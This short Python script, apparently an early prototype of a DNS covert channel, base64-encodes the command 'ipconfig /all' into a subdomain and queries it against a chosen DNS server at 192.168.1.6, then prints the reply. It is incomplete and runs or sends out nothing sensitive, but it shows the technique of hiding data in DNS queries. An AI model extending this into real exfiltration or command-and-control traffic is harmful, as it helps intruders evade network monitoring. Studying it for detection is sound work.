from dns import resolver
import subprocess
import base64

HOST = '192.168.1.6'
PORT = 53
CHUNK_LIMIT = 63

# Créer une instance de resolver
res = resolver.Resolver()

# Spécifier le serveur DNS
res.nameservers = [HOST]
res.port = PORT

cmd = b"ipconfig /all"
encoded_cmd = base64.b64encode(cmd).decode()
domain = f"{encoded_cmd}.tkt.fr"
# Faire une requête DNS
answer = res.resolve(domain, 'A')

# Afficher la réponse
for ipval in answer:
    print('IP', ipval.to_text())